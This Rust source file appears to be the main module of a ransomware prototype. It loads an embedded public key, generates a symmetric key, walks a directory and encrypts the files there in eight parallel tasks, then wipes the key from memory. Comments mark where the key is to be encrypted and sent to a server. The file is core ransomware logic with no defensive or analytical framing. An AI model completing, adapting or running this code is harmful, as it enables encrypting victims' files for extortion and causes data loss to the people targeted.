use filesystem::recurse_directory_with_channel;
use std::path::PathBuf;
use std::vec::Vec;

use zeroize::Zeroize;

mod encryptor;
mod filesystem;

const _THREADS: i32 = 8;

#[cfg(unix)]
const PUB_KEY: &[u8] = include_bytes!("../pub.key");

#[cfg(windows)]
const PUB_KEY: &[u8] = include_bytes!("..\\pub.key");

#[tokio::main]
async fn main() {
    let mut key = encryptor::generate_key();
    let (s, r) = crossbeam_channel::unbounded();

    let files =
        recurse_directory_with_channel(PathBuf::from("/home/kobiske/Videos/Test Folder/"), &s);
    if files.is_none() {
        return;
    }
    let files = files.unwrap();

    for file in files {
        let _ = s.send(file);
    }
    let mut threads = Vec::new();

    for _ in 0.._THREADS {
        let thread_reciever = r.clone();
        let thread_key = key.clone();
        threads.push(tokio::spawn(async move {
            encryptor::encrypt_files(thread_reciever, thread_key).await;
        }));
    }

    for thread in threads {
        let _ = thread.await;
    }
    // encrypt key here

    // send key to server here

    key.zeroize();
}
